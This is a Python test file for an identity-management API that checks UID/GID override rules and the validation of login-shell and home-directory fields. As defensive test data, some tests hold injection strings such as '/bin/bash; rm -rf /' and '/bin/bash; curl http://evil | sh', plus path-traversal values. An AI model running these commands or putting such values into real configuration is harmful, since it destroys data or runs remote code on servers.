"""Tests for the per-user UID / primary GID override on set_posix_attributes.

An override writes the value onto the user's PosixIdentity row. In-range values
that are free succeed; out-of-range values and values already held by another
active identity (in either namespace) are rejected.
"""

from rest_framework import status, test

from waldur_core.structure.tests import fixtures as structure_fixtures
from waldur_mastermind.marketplace import models, posix_ids, utils
from waldur_mastermind.marketplace import serializers as marketplace_serializers
from waldur_mastermind.marketplace.tests import factories
from waldur_mastermind.marketplace.tests.factories import OfferingUserFactory


class OfferingUserPosixIdOverrideTest(test.APITestCase):
    def setUp(self):
        self.fixture = structure_fixtures.CustomerFixture()
        self.customer = self.fixture.customer
        self.service_provider = factories.ServiceProviderFactory(customer=self.customer)
        self.offering = factories.OfferingFactory(customer=self.customer)
        self.pool = factories.PosixIdPoolFactory(
            service_provider=self.service_provider,
            min_uid=100000,
            max_uid=199999,
            next_uid=100000,
            min_gid=200000,
            max_gid=299999,
            next_gid=200000,
        )
        self.offering_user = self._provision()

    def _provision(self):
        offering_user = factories.OfferingUserFactory(offering=self.offering)
        utils.setup_linux_related_data(offering_user, self.offering)
        offering_user.save()
        return offering_user

    def url(self, offering_user=None):
        return OfferingUserFactory.get_url(
            offering_user or self.offering_user, action="set-posix-attributes"
        )

    def active_identity(self, consumer):
        return models.PosixIdentity.objects.filter(
            released_at__isnull=True, **posix_ids.principal_filter(consumer)
        ).first()

    def post(self, body, offering_user=None):
        self.client.force_authenticate(self.fixture.staff)
        return self.client.post(self.url(offering_user), body)

    def test_in_range_override_updates_the_identity(self):
        response = self.post({"uidnumber": 100050})
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(response.data["warnings"], [])

        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["uidnumber"], 100050)
        self.assertEqual(self.active_identity(self.offering_user).uid, 100050)

    def test_out_of_range_override_is_rejected(self):
        response = self.post({"uidnumber": 500000})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )
        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["uidnumber"], 100000)

    def test_value_owned_by_another_account_is_rejected(self):
        other = self._provision()  # allocated the next UID (100001)
        other.refresh_from_db()
        taken = other.backend_metadata["uidnumber"]
        response = self.post({"uidnumber": taken})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )
        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["uidnumber"], 100000)

    def test_partial_failure_rolls_back_the_whole_action(self):
        # uidnumber is valid + free, primarygroup conflicts with another account.
        other = self._provision()
        other.refresh_from_db()
        taken_gid = other.backend_metadata["primarygroup"]
        response = self.post({"uidnumber": 100050, "primarygroup": taken_gid})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )
        # The earlier (valid) UID change must not survive the later failure.
        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["uidnumber"], 100000)
        self.assertEqual(self.active_identity(self.offering_user).uid, 100000)

    def test_value_owned_by_a_robot_account_is_rejected(self):
        # Robot accounts share the provider's pool, so a UID held by one blocks
        # an OfferingUser override too (the DB unique constraint is the guard).
        resource = factories.ResourceFactory(offering=self.offering)
        robot = factories.RobotAccountFactory(resource=resource)
        models.PosixIdentity.objects.create(
            pool=self.pool, uid=100050, consumer=robot, offering=self.offering
        )
        response = self.post({"uidnumber": 100050})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_primary_gid_colliding_with_a_group_gid_is_rejected(self):
        # GIDs are a single namespace, so a primary-GID override must not claim a
        # value already actively held by a project group in the same pool.
        group = models.OfferingUserGroup.objects.create(offering=self.offering)
        models.PosixIdentity.objects.create(
            pool=self.pool, gid=200050, consumer=group, offering=self.offering
        )
        response = self.post({"primarygroup": 200050})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_value_below_bounds_is_rejected(self):
        response = self.post({"uidnumber": 999})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_override_to_a_released_value_is_allowed(self):
        # A released identity leaves the active unique set, so its value can be
        # pinned to another account.
        ghost = factories.OfferingUserFactory(offering=self.offering)
        identity = models.PosixIdentity.objects.create(
            pool=self.pool, uid=100050, user=ghost.user, offering=self.offering
        )
        ghost.delete()
        identity.refresh_from_db()
        self.assertIsNotNone(identity.released_at)

        response = self.post({"uidnumber": 100050})
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(self.active_identity(self.offering_user).uid, 100050)

    def test_no_pool_configured_rejects_the_override(self):
        self.pool.delete()
        response = self.post({"uidnumber": 100050})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_special_value_advisories(self):
        # An override to a reserved value succeeds but carries a warning.
        self.assertEqual(posix_ids.posix_value_advisories("UID", 100050), [])
        self.assertTrue(posix_ids.posix_value_advisories("UID", 65534))
        self.assertTrue(posix_ids.posix_value_advisories("UID", 3_000_000_000))

    def test_login_shell_with_shell_metacharacters_is_rejected(self):
        response = self.post({"login_shell": "/bin/bash; rm -rf /"})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_home_directory_traversal_is_rejected(self):
        response = self.post({"home_directory": "/home/../etc"})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_trailing_newline_never_reaches_the_config(self):
        # A trailing newline must not end up in the GLAuth config. DRF trims it
        # before validation (so the request succeeds with the stripped value),
        # and the path regex uses fullmatch as a backstop — either way no
        # newline is stored.
        response = self.post({"login_shell": "/bin/bash\n"})
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["loginShell"], "/bin/bash")

    def test_embedded_control_char_in_path_is_rejected(self):
        # An interior control character is not trimmed, so the fullmatch path
        # regex must reject it (it is outside the allowed character class).
        response = self.post({"home_directory": "/home/a\tb"})
        self.assertEqual(
            response.status_code, status.HTTP_400_BAD_REQUEST, response.data
        )

    def test_login_shell_only_still_works(self):
        response = self.post({"login_shell": "/bin/zsh"})
        self.assertEqual(response.status_code, status.HTTP_200_OK, response.data)
        self.assertEqual(response.data["warnings"], [])
        self.offering_user.refresh_from_db()
        self.assertEqual(self.offering_user.backend_metadata["loginShell"], "/bin/zsh")


class GlauthPathOptionValidationTest(test.APITestCase):
    """Offering-level login_shell / homedir_prefix must be path-validated too,
    not just the per-user override — they flow to the same root-run GLAuth/LDAP
    context via setup_linux_related_data."""

    def test_login_shell_rejects_shell_injection(self):
        serializer = marketplace_serializers.GLAuthPluginOptionsSerializer(
            data={"login_shell": "/bin/bash; curl http://evil | sh"}
        )
        self.assertFalse(serializer.is_valid())
        self.assertIn("login_shell", serializer.errors)

    def test_login_shell_accepts_valid_path(self):
        serializer = marketplace_serializers.GLAuthPluginOptionsSerializer(
            data={"login_shell": "/bin/zsh"}
        )
        self.assertTrue(serializer.is_valid(), serializer.errors)

    def test_homedir_prefix_rejects_traversal(self):
        serializer = marketplace_serializers.HeappePluginOptionsSerializer(
            data={"homedir_prefix": "/home/../../etc/"}
        )
        self.assertFalse(serializer.is_valid())
        self.assertIn("homedir_prefix", serializer.errors)

    def test_homedir_prefix_accepts_valid_prefix(self):
        serializer = marketplace_serializers.HeappePluginOptionsSerializer(
            data={"homedir_prefix": "/home/"}
        )
        self.assertTrue(serializer.is_valid(), serializer.errors)
